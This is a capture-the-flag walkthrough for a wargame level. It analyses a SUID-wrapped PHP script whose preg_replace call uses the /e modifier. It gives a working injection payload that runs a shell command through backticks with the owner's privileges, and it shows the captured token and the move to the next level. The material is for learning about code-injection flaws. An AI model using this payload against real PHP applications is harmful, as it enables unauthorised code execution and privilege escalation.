# Level 06 - PHP Regex Vulnerability

## Step 1: Examine available files

After logging in, let's check what files we have:

```sh
ls -l
```

We see two files:

```
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

Notice that `level06` has the SUID bit set (`s` in permissions), which means it runs with flag06's privileges.

## Step 2: Analyze the PHP code

When we run `level06`, it executes the `level06.php` file. Let's examine this PHP script:

```php
#!/usr/bin/php
<?php
function y($m) {
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}

function x($y, $z) {
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}

$r = x($argv[1], $argv[2]);
print $r;
?>
```

## Step 3: Understand the vulnerability

The key vulnerability is in this line:
```php
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

The `/e` modifier is critical - it makes PHP evaluate the replacement as PHP code. This creates a code execution vulnerability.

The pattern searches for text matching `[x anything]`. When found, it:
1. Captures "anything" as the second capture group
2. Executes `y("anything")` as PHP code

However, before that code runs, PHP processes any variables or expressions in the matched text. This is our attack vector.

## Step 4: Exploit the vulnerability

We can exploit this by creating a file with specially crafted content:

```sh
echo '[x ${`getflag`}]' > /tmp/exploit
```

When the script processes our input:
- It matches the pattern ```[x ${`getflag`}]```

- Before calling `y()`, PHP evaluates ```${`getflag`}```
- The backticks cause the shell command `getflag` to execute with flag06's privileges

## Step 5: Run the exploit

```sh
./level06 /tmp/exploit
```

Result:
```
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```

## Step 6: Proceed to next level

Now we can advance to level07:

```sh
su level07
Password: wiok45aaoguiboiki2tuin6ub
```
